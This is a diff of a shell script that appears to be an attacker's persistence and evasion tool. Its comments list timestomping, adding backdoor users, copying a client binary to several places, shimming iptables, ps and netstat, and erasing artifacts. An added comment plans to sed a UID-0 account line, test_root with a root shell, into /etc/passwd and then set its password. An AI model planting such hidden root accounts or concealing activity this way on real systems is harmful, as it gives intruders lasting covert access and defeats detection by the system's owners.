@@ -10,7 +10,7 @@
 #
 #
 #   TODO: Need to stop hardcoding. Less spaghetti in the code.
-#
+#   the code is NOT scalable at all, need to work on that. 
 #
 
 # Change host and port before the deployment 
@@ -33,6 +33,10 @@ setup(){
 # Timestomp 
 
 # Add backdoor users 
+# TODO: use sed and just paste directly to passwd
+# test_root:x:0:0:root:/root:/bin/bash    <-- SED this to /etc/passwd 
+# And then passwd oneliner to change the password. 
+# I need more testing, but I have a meeting and an exam in 30 min
 
 # Clone the client binary into different places 
 clone(){
@@ -165,5 +169,3 @@ shim_iptables
 shim_ps
 shim_netstat
 echo -e "========= Script have ended. Erase all artifaces. ========== \n"
-
-# Start copyman 
